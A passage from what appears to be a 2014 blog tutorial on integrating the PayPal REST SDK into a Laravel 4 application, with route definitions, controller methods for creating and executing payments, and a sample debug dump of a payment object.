class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">Payer</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">Payment</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">RedirectUrls</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">ExecutePayment</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">PaymentExecution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PayPal</span>\<span class="title">Api</span>\<span class="title">Transaction</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_api_context</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// setup PayPal api context</span></span><br><span class="line">        <span class="variable">$paypal_conf</span> = <span class="title class_">Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;paypal&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_api_context = <span class="keyword">new</span> <span class="title class_">ApiContext</span>(<span class="keyword">new</span> <span class="title class_">OAuthTokenCredential</span>(<span class="variable">$paypal_conf</span>[<span class="string">&#x27;client_id&#x27;</span>], <span class="variable">$paypal_conf</span>[<span class="string">&#x27;secret&#x27;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_api_context-&gt;<span class="title function_ invoke__">setConfig</span>(<span class="variable">$paypal_conf</span>[<span class="string">&#x27;settings&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Add-2-routes-for-processing-PayPal-checkout"><a href="#3-Add-2-routes-for-processing-PayPal-checkout" class="headerlink" title="3. Add 2 routes for processing PayPal checkout"></a>3. Add 2 routes for processing PayPal checkout</h2><p>Add this to <strong>app/routes.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;payment&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;payment&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;IndexController@postPayment&#x27;</span>,</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is after make the payment, PayPal redirect back to your site</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;payment/status&#x27;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;payment.status&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;IndexController@getPaymentStatus&#x27;</span>,</span><br><span class="line">));</span><br></pre></td></tr></table></figure><p>Update the controller, this method is when you submit the form or checkout shopping cart, then post to this route: <strong>app/controllers/IndexController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">postPayment</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payer</span> = <span class="keyword">new</span> <span class="title class_">Payer</span>();</span><br><span class="line">    <span class="variable">$payer</span>-&gt;<span class="title function_ invoke__">setPaymentMethod</span>(<span class="string">&#x27;paypal&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$item_1</span> = <span class="keyword">new</span> <span class="title class_">Item</span>();</span><br><span class="line">    <span class="variable">$item_1</span>-&gt;<span class="title function_ invoke__">setName</span>(<span class="string">&#x27;Item 1&#x27;</span>) <span class="comment">// item name</span></span><br><span class="line">        -&gt;<span class="title function_ invoke__">setCurrency</span>(<span class="string">&#x27;USD&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setQuantity</span>(<span class="number">2</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setPrice</span>(<span class="string">&#x27;15&#x27;</span>); <span class="comment">// unit price</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$item_2</span> = <span class="keyword">new</span> <span class="title class_">Item</span>();</span><br><span class="line">    <span class="variable">$item_2</span>-&gt;<span class="title function_ invoke__">setName</span>(<span class="string">&#x27;Item 2&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setCurrency</span>(<span class="string">&#x27;USD&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setQuantity</span>(<span class="number">4</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setPrice</span>(<span class="string">&#x27;7&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$item_3</span> = <span class="keyword">new</span> <span class="title class_">Item</span>();</span><br><span class="line">    <span class="variable">$item_3</span>-&gt;<span class="title function_ invoke__">setName</span>(<span class="string">&#x27;Item 3&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setCurrency</span>(<span class="string">&#x27;USD&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setQuantity</span>(<span class="number">1</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setPrice</span>(<span class="string">&#x27;20&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add item to list</span></span><br><span class="line">    <span class="variable">$item_list</span> = <span class="keyword">new</span> <span class="title class_">ItemList</span>();</span><br><span class="line">    <span class="variable">$item_list</span>-&gt;<span class="title function_ invoke__">setItems</span>(<span class="keyword">array</span>(<span class="variable">$item_1</span>, <span class="variable">$item_2</span>, <span class="variable">$item_3</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$amount</span> = <span class="keyword">new</span> <span class="title class_">Amount</span>();</span><br><span class="line">    <span class="variable">$amount</span>-&gt;<span class="title function_ invoke__">setCurrency</span>(<span class="string">&#x27;USD&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setTotal</span>(<span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$transaction</span> = <span class="keyword">new</span> <span class="title class_">Transaction</span>();</span><br><span class="line">    <span class="variable">$transaction</span>-&gt;<span class="title function_ invoke__">setAmount</span>(<span class="variable">$amount</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setItemList</span>(<span class="variable">$item_list</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setDescription</span>(<span class="string">&#x27;Your transaction description&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redirect_urls</span> = <span class="keyword">new</span> <span class="title class_">RedirectUrls</span>();</span><br><span class="line">    <span class="variable">$redirect_urls</span>-&gt;<span class="title function_ invoke__">setReturnUrl</span>(URL::<span class="title function_ invoke__">route</span>(<span class="string">&#x27;payment.status&#x27;</span>))</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setCancelUrl</span>(URL::<span class="title function_ invoke__">route</span>(<span class="string">&#x27;payment.status&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payment</span> = <span class="keyword">new</span> <span class="title class_">Payment</span>();</span><br><span class="line">    <span class="variable">$payment</span>-&gt;<span class="title function_ invoke__">setIntent</span>(<span class="string">&#x27;Sale&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setPayer</span>(<span class="variable">$payer</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setRedirectUrls</span>(<span class="variable">$redirect_urls</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">setTransactions</span>(<span class="keyword">array</span>(<span class="variable">$transaction</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$payment</span>-&gt;<span class="title function_ invoke__">create</span>(<span class="variable">$this</span>-&gt;_api_context);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\PayPal\<span class="built_in">Exception</span>\PPConnectionException <span class="variable">$ex</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">\Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;app.debug&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Exception: &quot;</span> . <span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . PHP_EOL;</span><br><span class="line">            <span class="variable">$err_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getData</span>(), <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Some error occur, sorry for inconvenient&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$payment</span>-&gt;<span class="title function_ invoke__">getLinks</span>() <span class="keyword">as</span> <span class="variable">$link</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$link</span>-&gt;<span class="title function_ invoke__">getRel</span>() == <span class="string">&#x27;approval_url&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$redirect_url</span> = <span class="variable">$link</span>-&gt;<span class="title function_ invoke__">getHref</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add payment ID to session</span></span><br><span class="line">    <span class="title class_">Session</span>::<span class="title function_ invoke__">put</span>(<span class="string">&#x27;paypal_payment_id&#x27;</span>, <span class="variable">$payment</span>-&gt;<span class="title function_ invoke__">getId</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$redirect_url</span>)) &#123;</span><br><span class="line">        <span class="comment">// redirect to paypal</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Redirect</span>::<span class="title function_ invoke__">away</span>(<span class="variable">$redirect_url</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Redirect</span>::<span class="title function_ invoke__">route</span>(<span class="string">&#x27;original.route&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;Unknown error occurred&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2014-09-19-integrate-paypal-sdk-into-laravel-4/paypal-summary.png" alt="PayPal summary"></p><p>Up to this point, you will see the page above.</p><p><img src="/images/posts/2014-09-19-integrate-paypal-sdk-into-laravel-4/paypal-pay.png" alt="PayPal pay"></p><p>Then login &amp; pay.</p><h2 id="4-Add-another-handler-to-handle-PayPal-after-payment"><a href="#4-Add-another-handler-to-handle-PayPal-after-payment" class="headerlink" title="4. Add another handler to handle PayPal after payment"></a>4. Add another handler to handle PayPal after payment</h2><p>Before that, when the payment successfully made, it will return this 2 parameters as query string</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">token</span><span class="operator">=</span>EC-<span class="number">05</span>R25178G5276364N</span><br><span class="line"><span class="attribute">PayerID</span><span class="operator">=</span>LXA67A9A83UD6</span><br></pre></td></tr></table></figure><p>Otherwise, ONLY <code>token</code> when the customer cancel the payment</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">token</span><span class="operator">=</span>EC-<span class="number">05</span>R25178G5276364N</span><br></pre></td></tr></table></figure><p><strong>app/controllers/IndexController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPaymentStatus</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Get the payment ID before session clear</span></span><br><span class="line">    <span class="variable">$payment_id</span> = <span class="title class_">Session</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;paypal_payment_id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clear the session payment ID</span></span><br><span class="line">    <span class="title class_">Session</span>::<span class="title function_ invoke__">forget</span>(<span class="string">&#x27;paypal_payment_id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="title class_">Input</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;PayerID&#x27;</span>)) || <span class="keyword">empty</span>(<span class="title class_">Input</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;token&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Redirect</span>::<span class="title function_ invoke__">route</span>(<span class="string">&#x27;original.route&#x27;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;Payment failed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payment</span> = <span class="title class_">Payment</span>::<span class="title function_ invoke__">get</span>(<span class="variable">$payment_id</span>, <span class="variable">$this</span>-&gt;_api_context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PaymentExecution object includes information necessary </span></span><br><span class="line">    <span class="comment">// to execute a PayPal account payment. </span></span><br><span class="line">    <span class="comment">// The payer_id is added to the request query parameters</span></span><br><span class="line">    <span class="comment">// when the user is redirected from paypal back to your site</span></span><br><span class="line">    <span class="variable">$execution</span> = <span class="keyword">new</span> <span class="title class_">PaymentExecution</span>();</span><br><span class="line">    <span class="variable">$execution</span>-&gt;<span class="title function_ invoke__">setPayerId</span>(<span class="title class_">Input</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;PayerID&#x27;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Execute the payment</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$payment</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$execution</span>, <span class="variable">$this</span>-&gt;_api_context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;<span class="title function_ invoke__">print_r</span>(<span class="variable">$result</span>);<span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;<span class="keyword">exit</span>; <span class="comment">// DEBUG RESULT, remove it later</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">getState</span>() == <span class="string">&#x27;approved&#x27;</span>) &#123; <span class="comment">// payment made</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Redirect</span>::<span class="title function_ invoke__">route</span>(<span class="string">&#x27;original.route&#x27;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;Payment success&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Redirect</span>::<span class="title function_ invoke__">route</span>(<span class="string">&#x27;original.route&#x27;</span>)</span><br><span class="line">        -&gt;<span class="title function_ invoke__">with</span>(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;Payment failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>See the <strong>DEBUG RESULT</strong> there, if you print it out, the output will be</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">PayPal\Api\Payment <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; PAY-<span class="number">24</span>J48306WV121522LKQNZSPI</span><br><span class="line">            [create_time] =&gt; <span class="number">2014</span>-<span class="number">09</span>-<span class="number">19</span><span class="attr">T02</span>:<span class="number">47</span>:<span class="number">25</span>Z</span><br><span class="line">            [update_time] =&gt; <span class="number">2014</span>-<span class="number">09</span>-<span class="number">19</span><span class="attr">T02</span>:<span class="number">53</span>:<span class="number">55</span>Z</span><br><span class="line">            [state] =&gt; approved</span><br><span class="line">            [intent] =&gt; sale</span><br><span class="line">            [payer] =&gt; PayPal\Api\Payer <span class="title function_ invoke__">Object</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [payment_method] =&gt; paypal</span><br><span class="line">                            [payer_info] =&gt; PayPal\Api\PayerInfo <span class="title function_ invoke__">Object</span></span><br><span class="line">                                (</span><br><span class="line">                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [email] =&gt; john.smith@example.com</span><br><span class="line">                                            [first_name] =&gt; John</span><br><span class="line">                                            [last_name] =&gt; Smith</span><br><span class="line">                                            [payer_id] =&gt; LXA67A9A83UD6</span><br><span class="line">                                            [shipping_address] =&gt; PayPal\Api\ShippingAddress <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                (</span><br><span class="line">                                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                        (</span><br><span class="line">                                                            [line1] =&gt; <span class="number">1</span> Main Terrace</span><br><span class="line">                                                            [line2] =&gt; </span><br><span class="line">                                                            [city] =&gt; Wolverhampton</span><br><span class="line">                                                            [state] =&gt; West Midlands</span><br><span class="line">                                                            [postal_code] =&gt; W12 <span class="number">4</span>LQ</span><br><span class="line">                                                            [country_code] =&gt; GB</span><br><span class="line">                                                            [recipient_name] =&gt; </span><br><span class="line">                                                        )</span><br><span class="line"></span><br><span class="line">                                                )</span><br><span class="line"></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                )</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            [transactions] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; PayPal\Api\Transaction <span class="title function_ invoke__">Object</span></span><br><span class="line">                        (</span><br><span class="line">                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [amount] =&gt; PayPal\Api\Amount <span class="title function_ invoke__">Object</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                (</span><br><span class="line">                                                    [total] =&gt; <span class="number">78.00</span></span><br><span class="line">                                                    [currency] =&gt; USD</span><br><span class="line">                                                    [details] =&gt; PayPal\Api\Details <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                        (</span><br><span class="line">                                                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                (</span><br><span class="line">                                                                    [subtotal] =&gt; <span class="number">78.00</span></span><br><span class="line">                                                                )</span><br><span class="line"></span><br><span class="line">                                                        )</span><br><span class="line"></span><br><span class="line">                                                )</span><br><span class="line"></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                    [description] =&gt; Your item description</span><br><span class="line">                                    [item_list] =&gt; PayPal\Api\ItemList <span class="title function_ invoke__">Object</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                (</span><br><span class="line">                                                    [items] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                        (</span><br><span class="line">                                                            [<span class="number">0</span>] =&gt; PayPal\Api\Item <span class="title function_ invoke__">Object</span></span><br><span class="line">                                                                (</span><br><span class="line">                                                                    [<span class="attr">_propMap</span>:PayPal\Common\<span class="attr">PPModel</span>:<span class="keyword">private</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">                                                                        (</span><br><span class="line">                                                                            [name] =&gt; Item <span class="number">1</span></span><br><span class="line">                                                                            [price] =&gt; <span class="number">15.00</span></span><br><span class="line">                                                                            [currency] =&gt; USD</span><br><span class="line">                                                                            [quantity] =&gt; <span 